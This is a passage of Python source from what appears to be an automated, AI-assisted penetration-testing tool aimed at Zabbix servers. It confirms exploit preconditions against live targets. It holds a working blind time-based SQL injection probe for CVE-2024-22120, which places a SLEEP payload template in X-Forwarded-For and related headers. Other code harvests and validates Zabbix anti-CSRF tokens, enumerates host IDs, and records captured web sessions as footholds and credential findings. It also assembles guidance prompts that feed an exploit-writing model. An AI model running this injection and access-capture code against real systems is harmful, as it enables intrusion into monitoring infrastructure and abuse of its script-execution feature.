                            headers=hdrs) as c:
                for path in cands:
                    if not path or path in seen:
                        continue
                    seen.add(path)
                    try:
                        er = c.get(base + ("/" + path.lstrip("/")))
                    except Exception:  # noqa: BLE001
                        continue
                    if er.status_code != 404:
                        snippet = (er.text or "").strip().replace("\r", "")[:400]
                        ev = (f"GET {base}/{path.lstrip('/')}\n"
                              f"HTTP {er.status_code}  ({len(er.text or '')} bytes)"
                              + (f"\n(discovered — advisory named {tep})" if path != tep else "")
                              + (f"\nContent-Type: {er.headers.get('Content-Type')}" if er.headers.get('Content-Type') else "")
                              + (f"\n---\n{snippet}" if snippet else ""))
                        shot = _capture_fact_screenshot(ip, port, path)
                        if shot:
                            ev += f"\nScreenshot: {shot}"
                        _record_confirmation(tgt, "endpoint_exists", path, "confirmed",
                                             evidence=ev,
                                             method="probe", claim_value=path, product=product)
                        return True
        except Exception:  # noqa: BLE001
            return False
        return False
    if probe == "action_permitted" and auth and auth.get("username"):
        # DATA-DRIVEN: spec.action_probe (login + benign action + success check).
        _spec = _probe_spec(product)
        if not (_spec and _spec.get("transport") == "jsonrpc"):
            return False
        _b = f"{base}{_spec.get('endpoint','/api_jsonrpc.php')}"
        _tok = _spec_jsonrpc_login(_b, _spec, auth, timeout=timeout)
        if not _tok:
            return False
        # resolve any {hostid}-style placeholder in the action params from the ledger
        _res = {}
        try:
            with get_db() as c, c.cursor() as cur:
                cur.execute("SELECT claim_key, claim_value FROM public.confirmed_facts "
                            "WHERE target=%s AND claim_type='object_id' AND status='confirmed'",
                            (tgt,))
                for ck, cv in cur.fetchall():
                    _res.setdefault(ck, []).append(cv)
        except Exception:  # noqa: BLE001
            pass
        ok = _spec_action_permitted(_b, _spec, _tok, _res, timeout=timeout)
        if ok:
            _record_confirmation(tgt, "action_permitted",
                                 (_spec.get("action_probe") or {}).get("method", "action"),
                                 "confirmed", evidence="benign action probe succeeded",
                                 method="api_execute", product=product)
        return bool(ok)
    return False


_IP_INJECTION_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Client-IP",
                         "True-Client-IP", "Forwarded", "X-Forwarded")


def _probe_injection_vectors(ip, port, product, resolved=None, auth=None,
                             session_cookie=None, timeout=25):
    """REQUIRED precondition: before the refine loop, DERIVE + CONFIRM where a
    blind-timing SQLi actually fires. The advisory names a field (e.g. Zabbix
    'clientip') but that value is frequently taken from a REQUEST HEADER
    (X-Forwarded-For), not a body param — the single assumption that sank 5
    CVE-2024-22120 builds. Probe candidate carriers with a cheap SLEEP(0) vs
    SLEEP(5) timing test and return the carrier(s) that actually delay.

    Operator ask: "that is a key field that is required and should have been
    checked before trying." Returns {confirmed:[{carrier,where,payload_template,
    delta}], guidance}. Product-aware (Zabbix today); extend per app."""
    import httpx as _hx, time as _t
    prod_l = (product or "").lower()
    resolved = resolved or {}
    confirmed = []
    # ── DATA-DRIVEN path: use the product's probe spec (scales without code) ──
    _spec = _probe_spec(product)
    if _spec and _spec.get("transport") == "jsonrpc" and auth and auth.get("username"):
        _base = f"http://{ip}:{port or 80}{_spec.get('endpoint','/api_jsonrpc.php')}"
        _tok = _spec_jsonrpc_login(_base, _spec, auth, timeout=timeout)
        if _tok:
            confirmed = _spec_injection_probe(_base, _spec, _tok, resolved, timeout=timeout)
        return _build_injection_vector_result(confirmed)
    # ── Zabbix: audit-log clientip sink, triggered on API script.execute ──
    if "zabbix" in prod_l and auth and auth.get("username"):
        base = f"http://{ip}:{port or 80}/api_jsonrpc.php"
        H = {"Content-Type": "application/json-rpc"}
        tok = None
        for pk in ("username", "user"):
            try:
                r = _hx.post(base, json={"jsonrpc": "2.0", "method": "user.login",
                                         "params": {pk: auth["username"],
                                                    "password": auth.get("password")},
                                         "id": 1}, headers=H, verify=False, timeout=timeout)
                tok = (r.json() or {}).get("result")
            except Exception:  # noqa: BLE001
                tok = None
            if tok:
                break
        if tok:
            hid = (resolved.get("hostid") or ["10084"])[0]
            scr = (resolved.get("scriptid") or ["1"])[0]

            def _timed(header, sec):
                hdrs = dict(H)
                if header:
                    hdrs[header] = f"127.0.0.1'-(SELECT SLEEP({sec}))-'"
                t0 = _t.time()
                try:
                    _hx.post(base, json={"jsonrpc": "2.0", "method": "script.execute",
                                         "params": {"scriptid": scr, "hostid": hid},
                                         "auth": tok, "id": 1},
                             headers=hdrs, verify=False, timeout=sec + 30)
                except Exception:  # noqa: BLE001
                    pass
                return _t.time() - t0

            for h in _IP_INJECTION_HEADERS:
                try:
                    b0 = _timed(h, 0)
                    b5 = _timed(h, 5)
                except Exception:  # noqa: BLE001
                    continue
                if (b5 - b0) >= 3.5:
                    confirmed.append({"carrier": h, "where": "header",
                                      "payload_template": "127.0.0.1'-(SELECT SLEEP({N}))-'",
                                      "delta": round(b5 - b0, 1),
                                      "endpoint": "/api_jsonrpc.php (script.execute) "
                                                  "or /zabbix.php?action=script.execute"})
                    break
    return _build_injection_vector_result(confirmed)


def _build_injection_vector_result(confirmed):
    """Shared result/guidance builder for the injection-vector probe (used by
    both the data-driven spec path and the legacy hardcoded path)."""
    bits = []
    if confirmed:
        c = confirmed[0]
        bits.append(
            f"INJECTION VECTOR CONFIRMED (probed live, NOT assumed): the blind "
            f"time-based SQLi fires via the {c['carrier']} {c['where']} "
            f"(observed +{c['delta']}s on SLEEP(5)). Put the payload in that "
            f"{c['where']}, NOT in a body/query param. Payload template: "
            f"{c['payload_template']} — replace {{N}} with the delay seconds. "
            + (f"Trigger endpoint: {c['endpoint']}." if c.get('endpoint') else ""))
    return {"confirmed": confirmed, "guidance": "\n".join(bits)}


def _enumerate_exploit_preconditions(ip, port, analysis, session_cookie=None,
                                      product=None, timeout=10, auth=None,
                                      access_inventory=None):
    """Confirm + RESOLVE the concrete prerequisites an exploit needs, instead
    of letting synth guess them. The advisory/research names preconditions in
    prose ("the user must have access to a host to run a script against");
    this step turns that into VERIFIED, concrete values the exploit can use
    (a real hostid the authenticated user can actually operate on).

    Operator ask: "did we confirm access to a host to run a script? that
    should be an enumeration step."

    General pattern: scan the research analysis.preconditions for object-ID
    requirements (host/hostid, user/userid, group, item, trigger, template,
    etc.), then — using the authenticated session — hit the app's listing
    surface and extract REAL ids the user can see. Returns:
      {resolved: {<kind>: [ids...]}, confirmed: [str...], unmet: [str...],
       guidance: str}

    App-aware resolvers (extend as needed); falls back to generic sitemap/
    discovered_params ID extraction for unknown apps.
    """
    import httpx as _hx, re as _re
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    preconds = []
    a = analysis or {}
    if isinstance(a.get("preconditions"), list):
        preconds = [str(p) for p in a["preconditions"]]
    pre_blob = " ".join(preconds).lower() + " " + str(a.get("summary", "")).lower()
    headers = {"User-Agent": "Mozilla/5.0 (compatible; PentestBot/1)"}
    if session_cookie:
        headers["Cookie"] = session_cookie
    resolved, confirmed, unmet = {}, [], []

    # ── Consume the post-access inventory FIRST (operator: "gather all
    # information from any logins before moving on"). Every object the login
    # already exposed is an authoritative, enumerated id — a precondition that
    # names such an object is RESOLVED from the inventory, no re-probe needed.
    _inv = access_inventory or {}
    if isinstance(_inv, dict):
        for _otype, _items in _inv.items():
            _ids = [str(it.get("id")) for it in (_items or []) if it.get("id")]
            if not _ids:
                continue
            resolved.setdefault(_otype, [])
            for _i in _ids:
                if _i not in resolved[_otype]:
                    resolved[_otype].append(_i)
            resolved[_otype] = resolved[_otype][:10]
            _named = ", ".join(
                f"{it['id']}({it.get('name','')})" if it.get("name") else str(it["id"])
                for it in (_items or [])[:5] if it.get("id"))
            confirmed.append(f"{_otype}: {_named} (enumerated from the login's "
                             f"post-access inventory)")

    def _grab_ids(text, keys):
        ids = []
        for k in keys:
            for m in _re.finditer(rf'["\']?{k}["\']?\s*[:=]\s*["\']?(\d+)', text, _re.I):
                v = m.group(1)
                if v not in ids and v not in ("0",):
                    ids.append(v)
        return ids[:10]

    prod_l = (product or "").lower()
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
                         headers=headers) as cli:
            # ── Zabbix: "host to run a script against" → enumerate hostids ──
            if ("host" in pre_blob or "script" in pre_blob or "zabbix" in prod_l) \
                    and not resolved.get("hostid"):
                hostids = []
                host_names = {}
                # Zabbix JSON-RPC API (user.login → host.get) — the authoritative
                # way to list hosts the user can operate on. Needs the creds, so
                # auth is threaded in. The UI host-list is AJAX and leaks no
                # hostid to a static fetch.
                if auth and auth.get("username") and auth.get("password"):
                    for h in _zabbix_api_hostids(ip, port, auth["username"], auth["password"]):
                        if h["hostid"] not in hostids:
                            hostids.append(h["hostid"]); host_names[h["hostid"]] = h.get("name", "")
                # UI fallback (older versions sometimes render hostids inline).
                if not hostids:
                    for path in ("/zabbix.php?action=host.view", "/hosts.php"):
                        try:
                            r = cli.get(base + path)
                            if r.status_code == 200 and r.text:
                                hostids += _grab_ids(r.text, ["hostid"])
                        except Exception:  # noqa: BLE001
                            continue
                hostids = list(dict.fromkeys(hostids))[:10]
                if hostids:
                    resolved["hostid"] = hostids
                    _named = ", ".join(f"{h}({host_names.get(h,'')})" if host_names.get(h) else h
                                       for h in hostids[:5])
                    confirmed.append(f"user can operate on {len(hostids)} host(s) "
                                     f"(via Zabbix API); usable hostid(s): {_named}")
                else:
                    unmet.append("could not enumerate a hostid the user can "
                                 "operate on — the exploit's script-execution "
                                 "precondition may not be met (user needs host "
                                 "access). Confirm the account has >=1 host.")
            # ── Zabbix `sid` (anti-CSRF token) — REQUIRED on POST actions or
            #    script.execute is rejected BEFORE the SQLi runs. It's session-
            #    derived (the live page's <meta name="csrf-token" content="...">,
            #    = sessionid[16:]), NOT a guessable value. Runs INDEPENDENTLY of
            #    the hostid branch (which is skipped when the access-inventory
            #    already seeded hostid) so the token is always extracted. Flows
            #    through resolved → _enforce_resolved_object_ids, which rewrites
            #    any stale/hardcoded `sid=<...>` the model emits.
            if ("zabbix" in prod_l or "host" in pre_blob or "script" in pre_blob) \
                    and session_cookie and not resolved.get("sid"):
                for _pth in ("/zabbix.php?action=dashboard.view",
                             "/zabbix.php?action=host.list", "/"):
                    try:
                        _pr = cli.get(base + _pth)
                        _mt = _re.search(
                            r'name=["\']csrf-token["\']\s+content=["\']([A-Za-z0-9]+)',
                            _pr.text or "", _re.I)
                        if not _mt:
                            continue
                        _tok = _mt.group(1)
                        # VALIDATE the token before relying on it (operator: "get
                        # token and validate it before sending it" / "do not
                        # assume anything"). A token that extracts but isn't
                        # accepted is worse than none — it reads as a failed
                        # exploit. Only a validated token enters resolved.
                        _hid = (resolved.get("hostid") or [None])[0]
                        _sid_ok, _sid_why = _probe_zabbix_sid_valid(
                            ip, port, session_cookie, _tok, hostid=_hid,
                            scriptid=(resolved.get("scriptid") or [1])[0])
                        if _sid_ok:
                            resolved["sid"] = [_tok]
                            confirmed.append(
                                f"sid (live Zabbix CSRF token, VALIDATED accepted "
                                f"by the target before use): {_tok} — {_sid_why}")
                            _record_confirmation(
                                f"{ip}:{port or 80}", "token_valid", "sid",
                                "confirmed", evidence=_sid_why, method="probe",
                                claim_value=_tok, product=product)
                            break
                        else:
                            unmet.append(
                                f"extracted a Zabbix sid ({_tok}) but it was NOT "
                                f"accepted on validation ({_sid_why}) — the "
                                f"session/CSRF token is stale; re-establish the "
                                f"session before the exploit relies on it")
                            _record_confirmation(
                                f"{ip}:{port or 80}", "token_valid", "sid",
                                "refuted", evidence=_sid_why, method="probe",
                                claim_value=_tok, product=product)
                    except Exception:  # noqa: BLE001
                        continue
            # ── Generic: any "<thing>id" precondition → sitemap/discovered ──
            generic_keys = []
            for kw in ("userid", "groupid", "itemid", "triggerid", "templateid",
                       "graphid", "mapid", "screenid", "dashboardid"):
                if kw in pre_blob or kw[:-2] in pre_blob:
                    generic_keys.append(kw)
            if generic_keys:
                try:
                    r = cli.get(base + "/")
                    ids = _grab_ids(r.text or "", generic_keys)
                    if ids:
                        for k in generic_keys:
                            kv = _grab_ids(r.text or "", [k])
                            if kv:
                                resolved[k] = kv
                                confirmed.append(f"{k}: {', '.join(kv[:5])}")
                except Exception:  # noqa: BLE001
                    pass
    except Exception as e:  # noqa: BLE001
        logging.debug("precondition enumeration failed: %s", e)

    # ── INJECTION VECTOR — a REQUIRED precondition. For a blind-timing SQLi,
    #    derive + PROBE where it actually fires (header vs body) BEFORE the loop,
    #    instead of assuming the advisory's field name is a request parameter.
    _vector_guidance = ""
    if ("sql" in pre_blob) and any(k in pre_blob for k in (
            "sleep", "time-based", "timing", "blind", "clientip",
            "x-forwarded", "audit", "latency")):
        try:
            _iv = _probe_injection_vectors(ip, port, product, resolved=resolved,
                                           auth=auth, session_cookie=session_cookie)
            if _iv.get("confirmed"):
                _c = _iv["confirmed"][0]
                _vector_guidance = _iv["guidance"]
                confirmed.append(f"injection vector: {_c['carrier']} {_c['where']} "
                                 f"(probed live, +{_c['delta']}s)")
                _record_confirmation(
                    f"{ip}:{port or 80}", "injection_vector", _c["carrier"],
                    "confirmed", evidence=f"blind-timing SQLi fires via {_c['carrier']} "
                                          f"{_c['where']} (+{_c['delta']}s on SLEEP(5))",
                    method="timing_probe", claim_value=f"{_c['where']}:{_c['carrier']}",
                    product=product, cve=(analysis or {}).get("cve"))
        except Exception as e:  # noqa: BLE001
            logging.debug("injection-vector probe failed: %s", e)

    # Build guidance
    bits = []
    if _vector_guidance:
        bits.append(_vector_guidance)
    # KNOWN REQUEST CONTRACT — supply the product's request shape as fact so the
    # model doesn't guess it (anti-CSRF param name, token source, action
    # endpoint, injection param). Operator: "fields like this should be part of
    # the known info the model can use instead of trying to determine it."
    _contract = _app_request_contract(product)
    if _contract:
        _csrf = _contract.get("csrf") or {}
        _cbits = ["KNOWN REQUEST CONTRACT (established facts for this product — "
                  "USE these, do NOT guess the request shape):",
                  f"  - action endpoint: {_contract.get('action_endpoint','?')} "
                  f"({_contract.get('method','POST')})"]
        if _csrf.get("param"):
            _cbits.append(f"  - anti-CSRF param is named `{_csrf['param']}` "
                          f"(NOT {', '.join(_csrf.get('aliases') or []) or 'other names'}); "
                          f"value = {_csrf.get('token_source','the live session token')}")
        if _contract.get("injection_param"):
            _cbits.append(f"  - typical injection param: {_contract['injection_param']}")
        if _contract.get("notes"):
            _cbits.append("  " + str(_contract["notes"]).strip().replace("\n", "\n  "))
        bits.append("\n".join(_cbits))
    if confirmed:
        bits.append("PRECONDITIONS CONFIRMED (enumerated from the authenticated "
                    "target — USE these real values, do NOT invent ids):")
        for c in confirmed:
            bits.append(f"  - {c}")
    if resolved:
        kv = "; ".join(f"{k}={v[0]}" for k, v in resolved.items() if v)
        if kv:
            bits.append(f"  Use concretely: {kv}")
    if unmet:
        bits.append("PRECONDITIONS NOT MET / UNRESOLVED:")
        for u in unmet:
            bits.append(f"  - {u}")
    return {"resolved": resolved, "confirmed": confirmed, "unmet": unmet,
            "guidance": "\n".join(bits)}


def _ensure_confirmed_facts_table():
    """Durable ledger of CONFIRMED (and refuted) readiness facts so a
    confirmation is never silently lost between iterations or builds.

    Operator ask: "how do we track that something is confirmed so we don't
    lose that status."

    Each row records WHAT was checked, the VERDICT, the EVIDENCE, HOW it was
    confirmed, WHEN, and a freshness TTL (session validity goes stale fast;
    'endpoint exists' is durable). The readiness gate writes every
    satisfied→confirmed and every blocker→refuted/unverified, and reads
    fresh prior confirmations first to avoid re-proving what's still known."""
    try:
        with get_db() as c, c.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS public.confirmed_facts (
                    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
                    engagement_id uuid,
                    target        text NOT NULL,     -- ip:port
                    host          text,              -- hostname/vhost (distinct from ip)
                    product       text,              -- APPLICATION — Zabbix != Apache on same ip:port
                    version       text,
                    cve           text,
                    claim_type    text NOT NULL,
                    claim_key     text NOT NULL,
                    claim_value   text,
                    status        text NOT NULL,
                    evidence      text,
                    method        text,
                    confidence    real NOT NULL DEFAULT 0.9,
                    ttl_seconds   int  NOT NULL DEFAULT 0,
                    source_run_id text,
                    confirmed_at  timestamptz NOT NULL DEFAULT now(),
                    last_checked_at timestamptz NOT NULL DEFAULT now()
                )
            """)
            # Add columns to pre-existing tables (idempotent).
            cur.execute("ALTER TABLE public.confirmed_facts "
                        "ADD COLUMN IF NOT EXISTS host text")
            # Identity MUST include product: the same ip:port runs multiple
            # apps (Zabbix the application vs Apache the web server), and a
            # fact confirmed for one is NOT a fact for the other. Migrate the
            # old product-less unique index to one scoped by product.
            cur.execute("DROP INDEX IF EXISTS public.uq_confirmed_fact")
            cur.execute("""CREATE UNIQUE INDEX IF NOT EXISTS uq_confirmed_fact
                ON public.confirmed_facts
                (target, COALESCE(product,''), claim_type, claim_key,
                 COALESCE(claim_value,''), COALESCE(cve,''))""")
            cur.execute("""CREATE INDEX IF NOT EXISTS idx_confirmed_target
                ON public.confirmed_facts (target, COALESCE(product,''))""")
            c.commit()
    except Exception as e:  # noqa: BLE001
        logging.debug("ensure confirmed_facts failed: %s", e)


# TTL defaults per claim type (seconds). Session validity expires fast;
# structural facts (endpoint exists, version applies) are durable (0).
_CONFIRM_TTL = {
    "session_valid": 900,       # 15 min — session cookies expire
    "target_reachable": 300,
    "object_id": 3600,          # ids can change but rarely mid-engagement
    "endpoint_exists": 0,
    "version_applies": 0,
    "precondition": 1800,
    "vendor_doc": 0,            # vendor docs don't change
}


def _register_web_session_access(ip, port, username, cookie, product=None,
                                   engagement_id=None):
    """A CONFIRMED, valid authenticated web session IS held access — register
    it in obtained_access so it shows up as a foothold on the asset (next to
    ssh/msf/bind/credential access), not just in the confirmed-facts ledger.

    Operator ask: "will this show up as a foothold on the asset?"

    kind='web_session', handle=user@product, transport='http_cookie',
    status='live'. Durable (a valid session is real access); the foothold
    watcher re-probes it via the same session-validity check."""
    if not username:
        return
    try:
        eid = _validate_engagement_uuid(engagement_id) if engagement_id else None
        handle = f"{username}@{product or 'webapp'}"
        whoami = username
        with get_db() as c, c.cursor() as cur:
            cur.execute("""
                INSERT INTO public.obtained_access
                  (target, port, kind, handle, transport, whoami, uid, is_root,
                   os_info, probes, probes_ok, last_probe_at, last_error, score,
                   status, engagement_id)
                VALUES (%s,%s,'web_session',%s,'http_cookie',%s,NULL,false,
                        %s,1,1,now(),'',60,'live',%s)
                ON CONFLICT (target, kind, handle) DO UPDATE SET
                  whoami = EXCLUDED.whoami, last_probe_at = now(),
                  probes = public.obtained_access.probes + 1,
                  probes_ok = public.obtained_access.probes_ok + 1,
                  status = CASE WHEN public.obtained_access.status = 'rejected'
                                THEN 'rejected' ELSE 'live' END
            """, (str(ip), port or 80, handle, whoami,
                  f"authenticated web session ({product or 'web'})", eid))
            # Mirror the foothold into credential_findings so the Credentials
            # section on the asset ALSO shows this user. Previously an
            # authenticated web session was registered as a foothold but never
            # as a credential — operator saw username@stock in Confirmed
            # Facts / foothold with nothing in Credentials. The cookie itself
            # stays as a <known> marker (the plaintext lives in the foothold
            # row's identity + web_auth_configs); the credential ledger is a
            # discovery ledger, not a secret store. Operator ask: "it has
            # username@stock but this doesn't show up in the credentials."
            try:
                cur.execute("""
                    INSERT INTO public.credential_findings
                      (ip, port, protocol, username, secret_value, secret_type,
                       valid_cred, auth_type, severity, source, status,
                       engagement_id, metadata)
                    VALUES (%s,%s,'http',%s,'<known>','session_cookie',
                            true,'cookie','medium','web_session_foothold',
                            'valid',%s,%s)
                    ON CONFLICT DO NOTHING
                """, (str(ip), int(port or 80), username, eid,
                      Json({"product": product, "foothold_handle": handle,
                             "transport": "http_cookie",
                             "source_hint": "registered when the authenticated session was validated"})))
            except Exception as e:  # noqa: BLE001
                logging.debug("mirror web_session->credential_findings failed: %s", e)
            c.commit()
        try:
            emit_webhook("foothold_web_session", "access",
                         {"target": str(ip), "port": port, "user": username,
                          "product": product, "engagement_id": eid})
        except Exception:  # noqa: BLE001
            pass
    except Exception as e:  # noqa: BLE001
        logging.debug("register web session access failed: %s", e)


def _record_confirmation(target, claim_type, claim_key, status, evidence="",
                          method="probe", claim_value=None, confidence=0.9,
                          product=None, version=None, cve=None,
                          engagement_id=None, run_id=None, ttl_seconds=None,
                          host=None):
    """Upsert one confirmation into the ledger. Identity is (target, PRODUCT,
    claim, claim_value, cve) — product is part of the key because the same
    ip:port runs multiple apps (Zabbix != Apache) and a fact for one is not a
    fact for the other. A later check UPDATES the matching row, so a
    refutation overwrites a stale confirmation and the timestamps track when
    we last knew."""
    _ensure_confirmed_facts_table()
    # Target-level facts are NOT CVE-specific: an enumerated hostid, a valid
    # session, a reachable target, an installed version or an existing endpoint
    # are true for the (target, product) regardless of which CVE prompted the
    # check. Store them cve-agnostic so they dedup into ONE reusable row instead
    # of one row per CVE (the Confirmed Facts panel was showing hostid/session
    # twice — once cve=NULL from access-enum, once cve=<build cve> from the
    # gate). Only genuinely exploit-specific claims keep the cve in their key.
    _TARGET_LEVEL_CLAIMS = {"object_id", "session_valid", "target_reachable",
                            "endpoint_exists", "version_applies"}
    if claim_type in _TARGET_LEVEL_CLAIMS:
        cve = None
    if ttl_seconds is None:
        ttl_seconds = _CONFIRM_TTL.get(claim_type, 0)
    try:
        with get_db() as c, c.cursor() as cur:
            cur.execute("""
                INSERT INTO public.confirmed_facts
                    (engagement_id, target, host, product, version, cve,
                     claim_type, claim_key, claim_value, status, evidence,
                     method, confidence, ttl_seconds, source_run_id,
                     confirmed_at, last_checked_at)
                VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,now(),now())
                ON CONFLICT (target, COALESCE(product,''), claim_type, claim_key,
                             COALESCE(claim_value,''), COALESCE(cve,''))
                DO UPDATE SET status = EXCLUDED.status,
                              host = COALESCE(EXCLUDED.host, public.confirmed_facts.host),
                              evidence = EXCLUDED.evidence,
                              method = EXCLUDED.method,
                              confidence = EXCLUDED.confidence,
                              ttl_seconds = EXCLUDED.ttl_seconds,
                              source_run_id = EXCLUDED.source_run_id,
                              last_checked_at = now(),
                              confirmed_at = CASE
                                  WHEN public.confirmed_facts.status = EXCLUDED.status
                                  THEN public.confirmed_facts.confirmed_at
                                  ELSE now() END
            """, (_validate_engagement_uuid(engagement_id) if engagement_id else None,
                  target, host, product, version, cve, claim_type, claim_key,
                  claim_value, status, evidence[:2000], method, confidence,
                  ttl_seconds, run_id))
            c.commit()
    except Exception as e:  # noqa: BLE001
        logging.debug("record confirmation failed: %s", e)


def _get_confirmation(target, claim_type, claim_key, cve=None, claim_value=None,
                       fresh_only=True, product=None):
    """Return the prior confirmation for this exact claim, or None. Scoped by
    PRODUCT — a Zabbix fact won't answer for an Apache attack on the same
    ip:port. When fresh_only, a row past its TTL is treated as stale (None)
    so the caller re-verifies instead of trusting an expired confirmation."""
    _ensure_confirmed_facts_table()
    try:
        with get_db() as c, c.cursor(cursor_factory=RealDictCursor) as cur:
            cur.execute("""
                SELECT *, EXTRACT(EPOCH FROM (now() - last_checked_at)) AS age_s
                FROM public.confirmed_facts
                WHERE target = %s AND claim_type = %s AND claim_key = %s
                  AND COALESCE(cve,'') = COALESCE(%s,'')
                  AND COALESCE(claim_value,'') = COALESCE(%s,'')
                  AND COALESCE(product,'') = COALESCE(%s,'')
                ORDER BY last_checked_at DESC LIMIT 1
            """, (target, claim_type, claim_key, cve, claim_value, product))
            row = cur.fetchone()
            if not row:
                return None
            if fresh_only and row.get("ttl_seconds"):
                if (row.get("age_s") or 0) > row["ttl_seconds"]:
                    return None  # stale → re-verify
            return dict(row)
    except Exception as e:  # noqa: BLE001
        logging.debug("get confirmation failed: %s", e)
        return None


def _probe_zabbix_sid_valid(ip, port, session_cookie, sid, hostid=None,
                            scriptid=None, timeout=10):
    """VALIDATE a Zabbix anti-CSRF `sid` is actually ACCEPTED before the exploit
    relies on it. Operator: "that should be a step, get token and validate it
    before sending it." Extracting the token isn't proof it works — a stale or
    mismatched sid makes the action router reject the request with a CSRF error
    BEFORE the payload runs, which the build can't tell from a failed exploit.

    Sends a BENIGN probe (no injection — clientip=127.0.0.1) with the token and
    reads the router's verdict: a bad sid yields a CSRF/auth rejection
    ('incorrect request', re-login redirect, 'not logged in'); a good one is
    accepted by the CSRF layer (even if the action then errors for an unrelated
    reason — we validate the TOKEN, not the action). Returns (valid, reason)."""
    import httpx as _hx
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    hdr = {"Cookie": session_cookie,
           "Content-Type": "application/x-www-form-urlencoded",
           "User-Agent": "Mozilla/5.0"}
    data = (f"action=script.execute&scriptid={scriptid or 1}"
            f"&hostid={hostid or 0}&sid={sid}&clientip=127.0.0.1")
    try:
        with _hx.Client(verify=False, timeout=timeout, follow_redirects=False) as c:
            r = c.post(base + "/zabbix.php", content=data, headers=hdr)
            body = (r.text or "").lower()
            loc = r.headers.get("location", "").lower()
            csrf_reject = any(m in body for m in (
                "incorrect request", "csrf", "invalid session", "not logged in",
                "you are not logged in"))
            auth_redirect = r.status_code in (301, 302) and (
                "index.php" in loc or "login" in loc)
            if csrf_reject or auth_redirect:
                return False, (f"sid rejected by CSRF layer (status {r.status_code}"
                               + (f", -> {loc}" if loc else "") + ")")
            return True, f"sid accepted by CSRF layer (status {r.status_code})"
    except Exception as e:  # noqa: BLE001
        return False, f"sid probe error: {e}"


def _capture_fact_screenshot(ip, port, path="/", cookie=None,
                              engagement_id=None, timeout=20):
    """Headless-render the response to disk via playwright-scanner /preview and
    return a URL path the UI can embed. Fail-soft: on ANY error returns None so
    text evidence still lands even when the headless browser can't reach the
    target (sandbox, scope refusal, timeout).

    Operator ask: "should we also get a screenshot for the response" — adds a
    visual on top of the text snippet already in evidence. For session_valid
    this makes "it looked logged in" audit-worthy at a glance; for
    endpoint_exists it shows what the discovered page actually looks like.

    Stored under /app/fact_screenshots on rag-api; served by
    GET /confirmed-facts/screenshot/{filename}."""
    import httpx as _hx, base64 as _b64, hashlib as _hl, os as _os, time as _t
    try:
        scheme = "https" if int(port or 80) in (443, 8443) else "http"
        url = f"{scheme}://{ip}:{port or 80}{path if path.startswith('/') else '/' + path}"
        scanner = _os.environ.get("PLAYWRIGHT_SCANNER_URL",
                                   "https://playwright-scanner:8014")
        hdrs = {}
        if engagement_id:
            hdrs["X-Engagement-Id"] = str(engagement_id)
        body = {"url": url, "width": 1280, "height": 800, "timeout": timeout}
        if cookie:
            # The /preview endpoint doesn't accept arbitrary request headers
            # today — scope-gated anyway — so we can't inject the auth cookie
            # from here. Still useful: an unauthenticated screenshot of the
            # endpoint plus the auth-cookie text evidence is better than text
            # alone, and some apps render identical dashboards for anon users
            # when the cookie is scoped elsewhere. Operator reads both.
            body["note"] = "unauth preview"
        r = _hx.post(f"{scanner}/preview", json=body, headers=hdrs,
                      verify=False, timeout=timeout + 5)
        if r.status_code != 200:
            return None
        obj = r.json()
        b64 = obj.get("screenshot_b64")
        if not b64:
            return None
        png = _b64.b64decode(b64)
        _os.makedirs("/app/fact_screenshots", exist_ok=True)
        # Hash the URL + timestamp bucket so re-captures of the same target
        # within a few minutes dedup; a fresh ledger write gets a fresh file.
        tag = _hl.sha256(f"{url}:{int(_t.time()//60)}".encode()).hexdigest()[:16]
        fp = f"/app/fact_screenshots/{tag}.png"
        with open(fp, "wb") as f:
            f.write(png)
        return f"/confirmed-facts/screenshot/{tag}.png"
    except Exception as e:  # noqa: BLE001
        logging.debug("fact screenshot capture failed: %s", e)
        return None


def _probe_session_valid(ip, port, cookie, product=None, timeout=8):
    """Is the authenticated session actually valid? Many apps return 200 with a
    login/warning/redirect page when the session is dead — which looks like
    success to a naive fetch. Probe an authenticated endpoint and check for
    not-logged-in markers. Returns (valid: bool, reason: str)."""
    import httpx as _hx
    if not cookie:
        return False, "no session cookie"
    scheme = "https" if int(port or 80) in (443, 8443) else "http"
    base = f"{scheme}://{ip}:{port or 80}"
    # Not-logged-in / access-denied markers across common apps.
    DEAD = ["please log in", "sign in to continue", "session expired",
            "you are not logged in", "login to continue", "access denied",
            "warning [refreshed", "<title>warning", "zbx_messages",
            "please re-login", "authentication required"]
    # App-aware authenticated probe path.
    prod_l = (product or "").lower()
    paths = ["/"]
    if "zabbix" in prod_l:
        paths = ["/zabbix.php?action=dashboard.view", "/zabbix.php?action=host.view"]
    elif "grafana" in prod_l:
        paths = ["/api/user"]
    elif "wordpress" in prod_l:
        paths = ["/wp-admin/"]
    try:
        with _hx.Client(verify=False, follow_redirects=True, timeout=timeout,
                         headers={"Cookie": cookie, "User-Agent": "Mozilla/5.0"}) as cli:
            for p in paths:
                try:
                    r = cli.get(base + p)
                except Exception:  # noqa: BLE001
                    continue
                body_l = (r.text or "").lower()
                snippet = (r.text or "").strip().replace("\r", "")[:600]
                # Build an evidence block the operator can read: the request,
                # the status, a few key response headers, and a body excerpt.
                # Keeps "the actual output" in the ledger, not just a verdict.
                hdrs = {k.lower(): r.headers.get(k) for k in
                        ("server", "content-type", "location", "set-cookie")
                        if r.headers.get(k)}
                hdr_lines = "\n".join(f"{k}: {v}" for k, v in hdrs.items())
                head = f"GET {p}\nHTTP {r.status_code}  ({len(r.text or '')} bytes)\n{hdr_lines}".strip()
                full = f"{head}\n---\n{snippet}" if snippet else head
                # A tiny body (<2KB) on an app page is almost always a
                # login/warning shell, not the real authenticated view.
                if len(r.text or "") < 2000 and any(m in body_l for m in DEAD):
                    return False, f"{p} returned a not-logged-in page ({len(r.text)}b)\n{full}"
                if any(m in body_l for m in DEAD):
                    return False, f"{p} contains a not-logged-in marker\n{full}"
                # Looks like real authenticated content.
                return True, f"{p} returned authenticated content ({len(r.text)}b)\n{full}"
    except Exception as e:  # noqa: BLE001
        return False, f"probe error: {e}"
    return False, "no authenticated endpoint confirmed"


def _validate_against_vendor_docs(product, version, questions, cve=None,
                                    model=None, max_pages=3):
